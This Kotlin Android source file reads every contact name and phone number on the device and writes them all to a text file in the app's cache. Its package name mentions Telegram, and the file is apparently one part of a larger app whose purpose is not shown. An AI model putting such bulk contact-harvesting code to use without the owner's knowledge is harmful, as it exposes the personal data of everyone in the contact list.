package com.kashem.shaikh.telegram

import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.provider.ContactsContract
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

object ContactsCollector {
    fun collectContacts(context: Context): File? {
        val resolver: ContentResolver = context.contentResolver
        val cursor: Cursor? = resolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        )
        cursor ?: return null
        val sb = StringBuilder()
        sb.appendLine("***** CONTACTS *****\n")
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        sb.appendLine("Generated: ${dateFormat.format(Date())}\n")
        val nameCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
        val numberCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
        while (cursor.moveToNext()) {
            val name = cursor.getString(nameCol) ?: "No Name"
            val number = cursor.getString(numberCol) ?: "No Number"
            sb.appendLine("$name : $number")
        }
        cursor.close()
        val file = File(context.cacheDir, "contacts.txt")
        FileOutputStream(file).use { it.write(sb.toString().toByteArray()) }
        return file
    }
}